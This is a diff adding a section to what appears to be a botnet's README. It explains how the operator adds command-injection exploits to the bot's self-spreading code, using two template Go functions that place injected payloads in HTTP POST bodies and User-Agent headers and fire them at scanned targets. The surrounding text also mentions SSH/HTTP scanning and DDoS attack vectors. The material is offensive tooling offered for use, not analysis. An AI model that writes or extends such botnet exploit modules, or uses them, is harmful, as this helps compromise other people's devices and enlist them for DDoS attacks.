@@ -57,6 +57,75 @@ Spread feature of this bot will scan on default SSH and HTTP port. Option about 
 	
 	4) Done... just save it.
 	
+# Add/Customize Exploit
+The exploit that's use in this botnet mostly will be a command injection (tbh it's all of it lmao). You can add a new exploit if you want, but i recommend it to be an command injection vulnerability because you don't need to add or write anything more you just need to config it. I try to make the feature exploit easy and felxible to configuration much as i can. If the 2 examples down below is not enough you can see more example in "internal/exploit.go".
+	
+	#############################################################
+	### Example 1 Incase that you want to add new HTTP header ###
+	#############################################################
+	
+	func (b *Bot) CVE_someYear_newCVE1() {
+		
+		# If you add a post exploit, then customize it with a json.
+		# Incase that your exploit need to inject on a post body just call an inject function --> b.inject("default or mips", true)
+		
+		
+		# In this example will use default architecture so that's why we put "default" if your exploit use mips just put "mips".
+		# Always put true because we are doing an exploit not scanning (The inject function has reused in the scanner function).
+			
+		newCVE1, _ := json.Marshal(map[string]string{
+			"example":      "something",
+			"example":      "something"+b.inject("default", true),
+		})
+		
+		# This is just a http header customization.
+		# Incase that your exploit need to inject on a header just doing the same with the body. 
+		
+		enewCVE1 := Exploit{
+			exploitName:       "CVE_someYear_newCVE1",			# Customize exploit name for a report process.
+			exploitMethod:     "POST",					# Which http method you will use for this exploit.
+			exploitHeader:     "example/something",				# Customize http header.
+			exploitBody:       convReader(newCVE1),				# Customize http body.
+			exploitAgent:      "example"+b.inject("default", true),		# Customize http agent.
+			exploitAccept:     "example",					# Customize http accept.
+			exploitContType:   "example",					# Customize http content type.
+			exploitConnection: "example",					# Customize http connection.
+		}
+		
+		# If you want to add new header then just call it, like the example down below.
+		
+		_, newHeader := enewCVE1.setupExploit(b.tempIP)			# Use "enewCVE1" for calling Exploit structure function.
+		newHeader.Header.Set("newHeader", "headerContent")		# Add new header (header, header_content).
+		b.exploitLauncher(enewCVE1, newHeader)				# Launch the exploit by put the exploit strucutre and header in to "b.exploitLauncher(ourExploit, ourHeader)" function.
+	}
+	
+	###################################################################
+	### Example 2 Incase that you don't need to add new HTTP header ###
+	###################################################################
+	
+	# This example is the same like the first example in a term of header and body config.
+	
+	func (b *Bot) CVE_someYear_newCVE2() {			
+		newCVE2, _ := json.Marshal(map[string]string{
+			"example":      "something",
+			"example":      "something"+b.inject("default", true),
+		})
+		enewCVE2 := Exploit{
+			exploitName:       "CVE_someYear_newCVE2",			# Customize exploit name for a report process.
+			exploitMethod:     "POST",					# Which http method you will use for this exploit.
+			exploitHeader:     "example/something",				# Customize http header.
+			exploitBody:       convReader(newCVE2),				# Customize http body.
+			exploitAgent:      "example"+b.inject("default", true),		# Customize http agent.
+			exploitAccept:     "example",					# Customize http accept.
+			exploitContType:   "example",					# Customize http content type.
+			exploitConnection: "example",					# Customize http connection.
+		}
+
+		b.exploitLauncher(enewCVE2,  b.selfRequest(enewCVE2))				# In the first you need to call "setupExploit" function but this example you don't need to call it.
+												# Just call "exploitLauncher" function and in the second argument use "selfRequest" function instead of a newHeader value. 
+												# Because we only use default header set and then put our exploit structure in to the "selfRequest" argument.
+	}
+	
 # Attack Feature
 Attack feature will play around with transport layer mostly, but also have an application and network layer too.
 All of the attack vectors except "http" DDoS vectors will be random source port and windows size automatically but dst port will let bot herder config by them self.
